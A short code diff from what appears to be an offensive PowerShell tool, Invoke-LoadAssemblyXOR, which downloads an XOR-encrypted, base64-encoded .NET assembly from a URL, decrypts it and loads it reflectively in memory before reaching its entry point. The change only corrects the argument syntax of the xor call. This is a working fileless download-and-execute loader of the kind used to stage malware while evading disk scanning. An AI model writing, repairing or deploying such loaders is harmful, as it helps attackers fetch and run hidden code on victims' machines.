@@ -47,7 +47,7 @@ function Invoke-LoadAssemblyXOR
 
     $WebClient = New-Object System.Net.WebClient
     $xorb64_bin = $WebClient.DownloadString($AssemblyUrl);
-    [Byte[]]$AssemblyBytes = [System.Convert]::FromBase64String((xor $xorb64_bin "decrypt", $Key));
+    [Byte[]]$AssemblyBytes = [System.Convert]::FromBase64String((xor $xorb64_bin "decrypt" $Key));
     $assembly = [System.Reflection.Assembly]::Load($AssemblyBytes)
 
     $ep = $assembly.EntryPoint
